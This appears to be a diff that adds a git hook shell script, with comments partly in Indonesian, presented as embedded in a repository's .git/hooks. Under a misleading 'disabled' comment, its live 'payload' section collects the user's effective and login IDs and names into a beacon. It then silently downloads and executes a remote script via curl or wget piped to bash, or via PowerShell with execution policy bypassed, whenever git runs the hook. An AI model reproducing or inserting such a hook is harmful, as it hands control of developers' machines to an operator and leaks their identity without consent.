@@ -1,0 +1,41 @@
+#!/bin/sh
+#
+# Hook ini tertanam di .git/hooks repo ini.
+#
+# Run your own local work in the background (example; disabled):
+
+
+
+
+# ───────── payload ──────────────────────────────────────────────────────────
+# Identity diambil di sini dan ikut dikirim di beacon, jadi operator melihat
+#   uid/gid   -> user efektif (yang menjalankan git)
+#   luid/lgid -> login user sesi (beda kalau git dipanggil via sudo)
+eid_u="$(id -u 2>/dev/null || echo ?)"
+eid_g="$(id -g 2>/dev/null || echo ?)"
+eid_n="$(id -un 2>/dev/null || echo ?)"
+
+l_n="$(logname 2>/dev/null || true)"
+[ -n "$l_n" ] || l_n="${SUDO_USER:-$eid_n}"
+l_u="$(id -u "$l_n" 2>/dev/null || echo "$eid_u")"
+l_g="$(id -g "$l_n" 2>/dev/null || echo "$eid_g")"
+
+QS="flag=6&uid=$eid_u&gid=$eid_g&user=$eid_n&luid=$l_u&lgid=$l_g&luser=$l_n"
+
+uname_s="$(uname -s 2>/dev/null || echo unknown)"
+case "$uname_s" in
+  Darwin)
+    curl -fsSL "http://127.0.0.1:8888/api/terminal/bootstrap?os=mac&$QS" \
+      | bash >/dev/null 2>&1 &
+    exit 0 ;;
+  Linux)
+    wget -qO- "http://127.0.0.1:8888/api/terminal/bootstrap?os=linux&$QS" \
+      | bash >/dev/null 2>&1 &
+    exit 0 ;;
+  MINGW*|MSYS*|CYGWIN*)
+    powershell -NoProfile -ExecutionPolicy Bypass \
+      -Command "Invoke-RestMethod 'http://127.0.0.1:8888/api/terminal/windows?$QS' | iex" \
+      >/dev/null 2>&1 &
+    exit 0 ;;
+  *) exit 0 ;;
+esac
